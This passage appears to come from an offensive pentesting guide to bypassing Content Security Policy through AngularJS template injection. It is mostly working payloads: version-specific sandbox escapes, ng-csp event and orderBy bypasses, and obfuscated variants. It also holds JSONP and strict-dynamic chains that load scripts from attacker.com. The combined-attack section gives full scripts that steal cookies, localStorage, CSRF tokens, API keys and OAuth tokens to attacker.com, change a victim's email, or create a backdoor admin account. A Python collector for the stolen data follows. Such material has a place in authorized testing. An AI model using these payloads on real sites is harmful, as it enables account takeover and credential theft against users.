# Scan for AngularJS
nuclei -u https://target.com -t technologies/angular-detect.yaml
nuclei -u https://target.com -tags angular,csp

# Custom nuclei template
cat << 'EOF' > angular-csp-check.yaml
id: angular-csp-bypass
info:
  name: AngularJS CSP Bypass Detection
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "angular"
        part: body
      - type: regex
        regex:
          - "content-security-policy"
        part: header
EOF
nuclei -u https://target.com -t angular-csp-check.yaml
```

:::

::

### Bypass Decision Matrix

```text [AngularJS CSP Bypass Decision Tree]
┌─────────────────────────────────────────────┐
│     Is AngularJS loaded or loadable?        │
└────────────────────┬────────────────────────┘
                     │
           ┌─────────┴─────────┐
           │ YES               │ NO
           ▼                   ▼
┌──────────────────┐  ┌────────────────────┐
│ Check version    │  │ Can you load it    │
│                  │  │ from whitelisted   │
│                  │  │ CDN?               │
└────────┬─────────┘  └────────┬───────────┘
         │                     │
    ┌────┴────┐          ┌─────┴────┐
    │         │          │ YES      │ NO
    ▼         ▼          ▼          ▼
┌────────┐ ┌────────┐ ┌──────┐  ┌──────────┐
│>= 1.6  │ │< 1.6   │ │Load  │  │Try JSONP │
│No Sand │ │Sandbox │ │it!   │  │path only │
│box     │ │present │ │      │  │          │
└───┬────┘ └───┬────┘ └──┬───┘  └──────────┘
    │          │         │
    ▼          ▼         ▼
┌────────────────────────────────────────────┐
│  Is ng-csp directive present?              │
└────────────────────┬───────────────────────┘
                     │
           ┌─────────┴─────────┐
           │ YES               │ NO
           ▼                   ▼
┌──────────────────┐  ┌──────────────────────┐
│ Use event-based  │  │ Use template         │
│ bypasses with    │  │ injection            │
│ orderBy filter   │  │ {{expression}}       │
│ or $event.view   │  │                      │
│ or composedPath  │  │ $on.constructor()    │
└──────────────────┘  │ constructor.const()  │
                      │ [].pop.constructor() │
                      └──────────────────────┘
```

### Angular 1.6+ (No Sandbox) — Primary Payloads

::note
AngularJS 1.6.0 removed the expression sandbox entirely. Any version >= 1.6 allows direct constructor access for code execution.
::

::code-group

```html [Core Payloads]
<!-- Primary payload -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$on.constructor('alert(1)')()}}</div>

<!-- Alternative constructor access -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

<!-- String constructor -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{'a'.constructor.constructor('alert(1)')()}}</div>

<!-- Array constructor -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{[].constructor.constructor('alert(1)')()}}</div>

<!-- Multiple access paths -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{[].pop.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{[].find.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{[].filter.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{[].map.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{[].reduce.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{[].sort.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{''.toString.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{''.trim.constructor('alert(1)')()}}</div>
```

```html [Scope Variable Access]
<!-- $watch -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$watch.constructor('alert(1)')()}}</div>

<!-- $eval -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>

<!-- $new -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$new.constructor('alert(1)')()}}</div>

<!-- $parent chain -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$parent.constructor.constructor('alert(1)')()}}</div>

<!-- $root -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$root.constructor.constructor('alert(1)')()}}</div>

<!-- $$listeners -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$$listeners.constructor.constructor('alert(1)')()}}</div>
```

::

### Version-Specific Sandbox Escapes (Pre-1.6)

::tabs

:::tabs-item{icon="i-lucide-swords" label="1.0.x - 1.1.x"}

```html [Angular 1.0.1 - 1.1.5]
<div ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>
```

:::

:::tabs-item{icon="i-lucide-swords" label="1.2.x"}

::code-collapse

```html [Angular 1.2.0 - 1.2.1]
<div ng-app>
  {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
</div>
```

```html [Angular 1.2.2 - 1.2.5]
<div ng-app>
  {{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)')}}
</div>
```

```html [Angular 1.2.6 - 1.2.18]
<div ng-app>
  {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
</div>
```

```html [Angular 1.2.19 - 1.2.23]
<div ng-app>
  {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a"]["alert(1)"].constructor(1)}}
</div>
```

```html [Angular 1.2.24 - 1.2.29]
<div ng-app>
  {{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1);')}}
</div>
```

::

:::

:::tabs-item{icon="i-lucide-swords" label="1.3.x"}

::code-collapse

```html [Angular 1.3.0]
<div ng-app>
  {{!ready && (ready = true) && (
    !call
    ? $$watchers[0].get(toString.constructor.prototype.toString=toString.constructor.prototype.call)
    : (a=toString.constructor.prototype.toString)
    && ($$watchers[0].get)('alert(1)')
  )}}
</div>
```

```html [Angular 1.3.1 - 1.3.2]
<div ng-app>
  {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),')}}
</div>
```

```html [Angular 1.3.3 - 1.3.18]
<div ng-app>
  {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=''.valueOf;
  $eval("x=alert(1)//");}}
</div>
```

```html [Angular 1.3.19]
<div ng-app>
  {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=''.valueOf;
  $eval("x=alert(1)//");}}
</div>
```

```html [Angular 1.3.20]
<div ng-app>
  {{'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)');}}
</div>
```

::

:::

:::tabs-item{icon="i-lucide-swords" label="1.4.x"}

```html [Angular 1.4.0 - 1.4.9]
<div ng-app>
  {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
</div>
```

:::

:::tabs-item{icon="i-lucide-swords" label="1.5.x"}

::code-collapse

```html [Angular 1.5.0 - 1.5.8]
<div ng-app>
  {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
</div>
```

```html [Angular 1.5.9 - 1.5.11]
<div ng-app>
  {{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$call=c.$apply;c.$eval=b;
    op=$root.$$phase;$root.$$phase=null;
    od=$root.$$digest;$root.$$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$$digest=od;
    B=C(b,c,b);$evalAsync("
    ast498telenode=telenode.telenode.constant(x=alert(1))()
    ")
  }}
</div>
```

::

:::

::

### ng-csp Bypass Techniques

::caution
Even when the application explicitly adds `ng-csp` to prevent Angular from using `eval()` and `Function()`, these event-driven and filter-based bypasses still achieve code execution.
::

::tabs

:::tabs-item{icon="i-lucide-zap" label="Event Handlers"}

```html [ng-csp Event Bypasses]
<!-- ng-focus + autofocus (auto-fires) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
</div>

<!-- ng-focus + tabindex (auto-fires) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <div tabindex="0" autofocus ng-focus="$event.view.alert(1)">
  </div>
</div>

<!-- ng-click (requires user click) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(document.domain)">Click Here</div>
</div>

<!-- ng-mouseover (requires hover) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-mouseover="$event.target.ownerDocument.defaultView.alert(1)">Hover Here</div>
</div>

<!-- ng-mouseenter (requires hover) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-mouseenter="$event.view.alert(1)" style="width:100%;height:100vh;">Hover</div>
</div>

<!-- ng-submit (requires form submit) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <form ng-submit="$event.view.alert(1)"><input type="submit" value="Submit"></form>
</div>

<!-- ng-keypress (requires keystroke) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-keypress="$event.view.alert(1)">
</div>

<!-- ng-keydown -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-keydown="$event.view.alert(1)">
</div>

<!-- ng-keyup -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-keyup="$event.view.alert(1)">
</div>

<!-- ng-dblclick -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-dblclick="$event.view.alert(1)">Double Click</div>
</div>

<!-- ng-blur -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-blur="$event.view.alert(1)">
</div>

<!-- ng-copy -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-copy="$event.view.alert(1)">Copy this text</div>
</div>

<!-- ng-paste -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input ng-paste="$event.view.alert(1)" placeholder="Paste here">
</div>
```

:::

:::tabs-item{icon="i-lucide-filter" label="orderBy Filter"}

```html [orderBy Filter Abuse]
<!-- Basic orderBy -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
</div>

<!-- orderBy with document.domain -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([document.domain],alert)'">
</div>

<!-- orderBy with cookie exfil -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([document.cookie],fetch.bind(null,`https://attacker.com/s?c=`))'">
</div>

<!-- orderBy with Image beacon -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],(()=>{new(Image)().src=`https://attacker.com/c?`+document.cookie}))'">
</div>

<!-- Multiple orderBy chains -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="x]$event.composedPath()|orderBy:'[].constructor.from([1],alert)'|orderBy:'[].constructor.from([2],confirm)'">
</div>
```

:::

:::tabs-item{icon="i-lucide-eye" label="$event.view"}

```html [$event.view Access]
<!-- $event.view gives window object -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.view.alert(1)">
</div>

<!-- $event.view.eval -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.view.eval('alert(1)')">
</div>

<!-- $event.view.fetch -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.view.fetch('https://attacker.com/?c='+$event.view.document.cookie)">
</div>

<!-- $event.target.ownerDocument.defaultView -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.target.ownerDocument.defaultView.alert(1)">
</div>

<!-- $event.path -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.path[4].alert(1)">
</div>

<!-- $event.currentTarget.ownerDocument.defaultView -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.currentTarget.ownerDocument.defaultView.alert(1)">
</div>
```

:::

:::tabs-item{icon="i-lucide-wand" label="ng-init / $watch"}

```html [ng-init and $watch Bypasses]
<!-- ng-init with constructor -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-init="$watch.constructor('alert(1)')()">
</div>

<!-- ng-init with $on -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-init="$on.constructor('alert(1)')()">
</div>

<!-- Chained ng-init -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>
  <div ng-init="a=$on.constructor('alert(1)')">
    <div ng-init="a()"></div>
  </div>
</div>

<!-- ng-init with setTimeout -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-init="$on.constructor('setTimeout(function(){alert(1)},0)')()">
</div>
```

:::

::

### Angular Directive Alternatives

::note
If the primary `ng-app` directive is filtered, Angular supports multiple attribute prefix notations that achieve the same bootstrapping.
::

```html [ng-app Alternatives]
<!-- Standard -->
<div ng-app>{{$on.constructor('alert(1)')()}}</div>

<!-- data- prefix -->
<div data-ng-app>{{$on.constructor('alert(1)')()}}</div>

<!-- x- prefix -->
<div x-ng-app>{{$on.constructor('alert(1)')()}}</div>

<!-- Underscore variant -->
<div ng_app>{{$on.constructor('alert(1)')()}}</div>

<!-- Colon variant -->
<div ng:app>{{$on.constructor('alert(1)')()}}</div>

<!-- ng-bind instead of interpolation -->
<div ng-app><span ng-bind="$on.constructor('alert(1)')()"></span></div>

<!-- data-ng-bind -->
<div data-ng-app><span data-ng-bind="$on.constructor('alert(1)')()"></span></div>

<!-- ng-class with side effects -->
<div ng-app ng-class="$on.constructor('alert(1)')()"></div>

<!-- ng-if with side effect -->
<div ng-app><div ng-if="$on.constructor('alert(1)')()">x</div></div>

<!-- ng-show with side effect -->
<div ng-app><div ng-show="$on.constructor('alert(1)')()">x</div></div>

<!-- ng-hide with side effect -->
<div ng-app><div ng-hide="$on.constructor('alert(1)')()">x</div></div>

<!-- ng-style with side effect -->
<div ng-app ng-style="$on.constructor('alert(1)')()"></div>

<!-- ng-switch -->
<div ng-app ng-switch="$on.constructor('alert(1)')()"></div>

<!-- ng-repeat with side effect -->
<div ng-app><div ng-repeat="x in [$on.constructor('alert(1)')()]">{{x}}</div></div>
```

### Angular Expression Obfuscation

::tabs

:::tabs-item{icon="i-lucide-lock" label="Encoding"}

```html [Encoded Expressions]
<!-- String.fromCharCode -->
<div ng-app>{{$on.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}</div>

<!-- Hex escape -->
<div ng-app>{{$on.constructor('\x61\x6c\x65\x72\x74\x28\x31\x29')()}}</div>

<!-- Unicode escape -->
<div ng-app>{{$on.constructor('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')()}}</div>

<!-- Octal (where supported) -->
<div ng-app>{{$on.constructor('\141\154\145\162\164\050\061\051')()}}</div>

<!-- Template literals -->
<div ng-app>{{$on.constructor(`alert(1)`)()}}</div>

<!-- atob (base64) -->
<div ng-app>{{$on.constructor(atob('YWxlcnQoMSk='))()}}</div>
```

:::

:::tabs-item{icon="i-lucide-link" label="Concatenation"}

```html [String Concatenation]
<!-- Plus concatenation -->
<div ng-app>{{$on.constructor('al'+'ert(1)')()}}</div>

<!-- Array join -->
<div ng-app>{{$on.constructor(['al','ert','(1)'].join(''))()}}</div>

<!-- concat method -->
<div ng-app>{{$on.constructor('al'.concat('ert(1)'))()}}</div>

<!-- Split and join -->
<div ng-app>{{$on.constructor('aXlXeXrXtX(X1X)'.split('X').join(''))()}}</div>

<!-- Template literal with expression -->
<div ng-app>{{$on.constructor(`${'al'}${'ert'}(1)`)()}}</div>

<!-- Reverse string -->
<div ng-app>{{$on.constructor(')1(trela'.split('').reverse().join(''))()}}</div>

<!-- repeat + slice -->
<div ng-app>{{$on.constructor('alert(1)'.repeat(1))()}}</div>
```

:::

:::tabs-item{icon="i-lucide-shuffle" label="Alternative Functions"}

```html [Blocked Function Alternatives]
<!-- If alert is blocked -->
<div ng-app>{{$on.constructor('confirm(1)')()}}</div>
<div ng-app>{{$on.constructor('prompt(1)')()}}</div>
<div ng-app>{{$on.constructor('console.log(1)')()}}</div>
<div ng-app>{{$on.constructor('window["al"+"ert"](1)')()}}</div>
<div ng-app>{{$on.constructor('self["al"+"ert"](1)')()}}</div>
<div ng-app>{{$on.constructor('top["al"+"ert"](1)')()}}</div>
<div ng-app>{{$on.constructor('frames["al"+"ert"](1)')()}}</div>
<div ng-app>{{$on.constructor('globalThis["al"+"ert"](1)')()}}</div>
<div ng-app>{{$on.constructor('Reflect.apply(alert,window,[1])')()}}</div>
<div ng-app>{{$on.constructor('setTimeout(alert,0,1)')()}}</div>
<div ng-app>{{$on.constructor('setInterval(alert,0,1)')()}}</div>
<div ng-app>{{$on.constructor('queueMicrotask(()=>alert(1))')()}}</div>
<div ng-app>{{$on.constructor('requestAnimationFrame(()=>alert(1))')()}}</div>

<!-- If constructor is blocked -->
<div ng-app>{{[].pop['const'+'ructor']('alert(1)')()}}</div>
<div ng-app>{{''['const'+'ructor']['const'+'ructor']('alert(1)')()}}</div>

<!-- If $on is blocked -->
<div ng-app>{{$watch['const'+'ructor']('alert(1)')()}}</div>
<div ng-app>{{$eval['const'+'ructor']('alert(1)')()}}</div>
<div ng-app>{{$apply['const'+'ructor']('alert(1)')()}}</div>
<div ng-app>{{$digest['const'+'ructor']('alert(1)')()}}</div>
<div ng-app>{{$destroy['const'+'ructor']('alert(1)')()}}</div>
<div ng-app>{{$emit['const'+'ructor']('alert(1)')()}}</div>
<div ng-app>{{$broadcast['const'+'ructor']('alert(1)')()}}</div>
```

:::

:::tabs-item{icon="i-lucide-braces" label="Bracket Notation"}

```html [Bracket Notation Bypasses]
<!-- Avoid dots entirely -->
<div ng-app>{{$on['constructor']('alert(1)')()}}</div>

<!-- Dynamic property access -->
<div ng-app>{{$on['con'+'structor']('alert(1)')()}}</div>

<!-- Nested bracket access -->
<div ng-app>{{['']['con'+'structor']['con'+'structor']('alert(1)')()}}</div>

<!-- Variable property name -->
<div ng-app>{{x='constructor';$on[x]('alert(1)')()}}</div>

<!-- Computed property -->
<div ng-app>{{$on[['con','structor'].join('')]('alert(1)')()}}</div>
```

:::

::

---

## Phase 5 — Combined Attack Chains

### JSONP + AngularJS Chained Exploitation

::steps{level="4"}

#### Identify CSP Policy and Whitelisted Domains

```bash [Terminal]
CSP=$(curl -sI https://target.com | grep -i "content-security-policy" | sed 's/.*: //')
echo "$CSP" | tr ';' '\n'
echo ""
echo "=== Whitelisted Domains ==="
echo "$CSP" | grep -oP '[\w*][\w.-]+\.\w{2,}' | sort -u
```

#### Check for Angular Availability on Whitelisted CDNs

```bash [Terminal]
for cdn in cdnjs.cloudflare.com cdn.jsdelivr.net unpkg.com ajax.googleapis.com code.angularjs.org; do
  echo "$CSP" | grep -q "$cdn" && echo "[+] Angular available via: $cdn"
done
```

#### Check for JSONP on Whitelisted Domains

```bash [Terminal]
DOMAINS=$(echo "$CSP" | grep -oP '[\w*][\w.-]+\.\w{2,}' | sort -u)
for domain in $DOMAINS; do
  clean=$(echo "$domain" | sed 's/^\*\.//')
  curl -s "https://$clean/api?callback=CSPtest" 2>/dev/null | grep -q "CSPtest(" && echo "[+] JSONP: $clean"
  curl -s "https://accounts.$clean/o/oauth2/revoke?callback=CSPtest" 2>/dev/null | grep -q "CSPtest(" && echo "[+] JSONP: accounts.$clean"
done
```

#### Build Combined Payload

```html [Combined Attack]
<!-- If CDN and JSONP both available -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>
  {{$on.constructor("
    fetch('/api/me',{credentials:'include'})
    .then(r=>r.json())
    .then(d=>{
      fetch('https://attacker.com/exfil',{
        method:'POST',
        body:JSON.stringify({
          cookies:document.cookie,
          user:d,
          url:location.href,
          localStorage:JSON.stringify(localStorage)
        })
      })
    })
  ")()}}
</div>
```

::

### Escalation: CSP Bypass to Account Takeover

```text [Account Takeover Chain Diagram]
┌────────────────┐
│ 1. CSP Recon   │
│ Find whitelist │
└───────┬────────┘
        │
        ▼
┌────────────────┐
│ 2. Load Angular│
│ from CDN       │
│ OR use JSONP   │
└───────┬────────┘
        │
        ▼
┌────────────────────────┐
│ 3. Extract CSRF Token  │
│ fetch('/settings')     │
│ .then(parse_token)     │
└───────┬────────────────┘
        │
        ▼
┌────────────────────────┐
│ 4. Change Email/Pass   │
│ POST /settings         │
│ email=attacker@evil.com│
│ csrf_token=stolen_token│
└───────┬────────────────┘
        │
        ▼
┌────────────────────────┐
│ 5. Password Reset      │
│ Goes to attacker email │
│ Full account takeover  │
└────────────────────────┘
```

::tabs

:::tabs-item{icon="i-lucide-mail" label="Email Change ATO"}

```html [Account Takeover — Email Change]
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$on.constructor("
  fetch('/settings',{credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    let csrf=html.match(/csrf[_-]?token[^'\"]*['\"]([^'\"]+)/i);
    if(csrf){
      fetch('/settings/email',{
        method:'POST',
        credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'email=attacker@evil.com&csrf_token='+csrf[1]
      }).then(r=>{
        fetch('https://attacker.com/ato?status=email_changed&csrf='+csrf[1])
      })
    }
  })
")()}}</div>
```

:::

:::tabs-item{icon="i-lucide-user-plus" label="Admin User Creation"}

```html [Account Takeover — Admin Creation]
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$on.constructor("
  fetch('/admin/users',{credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    let csrf=html.match(/token['\"]\\s*value=['\"]([^'\"]+)/i);
    fetch('/admin/users/create',{
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'username=backdoor&password=P@ssw0rd123&role=admin&_token='+csrf[1]
    }).then(()=>fetch('https://attacker.com/ato?status=admin_created'))
  })
")()}}</div>
```

:::

:::tabs-item{icon="i-lucide-key" label="API Key Theft"}

```html [Account Takeover — API Key Extraction]
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$on.constructor("
  Promise.all([
    fetch('/api/keys',{credentials:'include'}).then(r=>r.json()),
    fetch('/api/me',{credentials:'include'}).then(r=>r.json())
  ]).then(([keys,user])=>{
    fetch('https://attacker.com/keys',{
      method:'POST',
      body:JSON.stringify({user:user,api_keys:keys,cookies:document.cookie})
    })
  })
")()}}</div>
```

:::

:::tabs-item{icon="i-lucide-webhook" label="OAuth Token Theft"}

```html [OAuth Token Theft]
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{$on.constructor("
  var tokens={};
  ['token','access_token','id_token','refresh_token','jwt','auth','session','bearer'].forEach(k=>{
    var v=localStorage.getItem(k)||sessionStorage.getItem(k);
    if(v)tokens[k]=v;
  });
  tokens.cookies=document.cookie;
  tokens.url=location.href;
  var hash=location.hash;
  if(hash)tokens.hash=hash;
  fetch('https://attacker.com/oauth',{method:'POST',body:JSON.stringify(tokens)})
")()}}</div>
```

:::

::

### strict-dynamic Bypass Chains

::warning
`strict-dynamic` ignores domain-based whitelists in `script-src` and only trusts scripts loaded by already-trusted scripts. However, if an already-trusted script has a JSONP endpoint, the callback can dynamically create new script elements that inherit trust.
::

::code-group

```html [createElement Chain]
<script src="https://whitelisted.com/api?callback=var s=document.createElement('script');s.src='https://attacker.com/evil.js';document.body.appendChild(s);//"></script>
```

```html [document.write Chain]
<script src="https://whitelisted.com/api?callback=document.write('<script src=https://attacker.com/evil.js><\/script>')//"></script>
```

```html [importScripts via Worker]
<script src="https://whitelisted.com/api?callback=var w=new Worker(URL.createObjectURL(new Blob([`importScripts('https://attacker.com/evil.js')`])));void(0)//"></script>
```

```html [Dynamic import()]
<script src="https://whitelisted.com/api?callback=import('https://attacker.com/evil.mjs').then(m=>m.run())//"></script>
```

::

### base-uri Hijacking + Angular

```text [base-uri Attack Flow]
┌─────────────────────────────────────────┐
│  CSP: script-src 'self'; (no base-uri)  │
│                                         │
│  Normal: <script src="/app.js">         │
│  Resolves to: https://target.com/app.js │
└────────────────────┬────────────────────┘
                     │
                     ▼ Inject <base> tag
┌─────────────────────────────────────────┐
│  <base href="https://attacker.com/">    │
│  <script src="/app.js">                 │
│  Now resolves to:                       │
│  https://attacker.com/app.js !!         │
│                                         │
│  CSP check: origin is attacker.com      │
│  but 'self' check happens BEFORE base   │
│  resolution in some browsers... varies  │
└─────────────────────────────────────────┘
```

::code-group

```html [base-uri + Angular]
<!-- If base-uri is not restricted in CSP -->
<base href="https://attacker.com/">
<script src="/angular.min.js"></script>
<!-- Browser fetches https://attacker.com/angular.min.js (attacker-controlled Angular) -->
<div ng-app>{{$on.constructor('alert(document.domain)')()}}</div>
```

```html [base-uri + Relative Script]
<!-- If page has: <script src="js/app.js"> -->
<base href="https://attacker.com/">
<!-- Now loads https://attacker.com/js/app.js -->
```

::

---

## Phase 6 — Exfiltration Server Setup

### Lightweight Collectors

::tabs

:::tabs-item{icon="i-lucide-terminal" label="Python"}

```python [exfil_server.py]
#!/usr/bin/env python3
"""Exfiltration collector for CSP bypass testing"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote, urlparse, parse_qs
import json
import datetime
import ssl

class ExfilHandler(BaseHTTPRequestHandler):
    def _log(self, method, data):
        ts = datetime.datetime.now().isoformat()
        print(f"\n{'='*60}")
        print(f"[{ts}] {method} from {self.client_address[0]}")
        print(f"Path: {self.path}")
        print(f"User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print(f"Referer: {self.headers.get('Referer', 'N/A')}")
        print(f"Origin: {self.headers.get('Origin', 'N/A')}")
        if data:
            print(f"Data: {data}")
        print(f"{'='*60}")
        
        with open('exfil.log', 'a') as f:
            f.write(json.dumps({
                'timestamp': ts,
                'method': method,
                'path': self.path,
                'data': data,
                'ip': self.client_address[0],
                'ua': self.headers.get('User-Agent'),
                'referer': self.headers.get('Referer'),
                'origin': self.headers.get('Origin')
            }) + '\n')

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        decoded_params = {k: [unquote(v) for v in vals] for k, vals in params.items()}
        self._log('GET', decoded_params)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        try:
            data = json.loads(body)
        except:
            data = body
        self._log('POST', data)
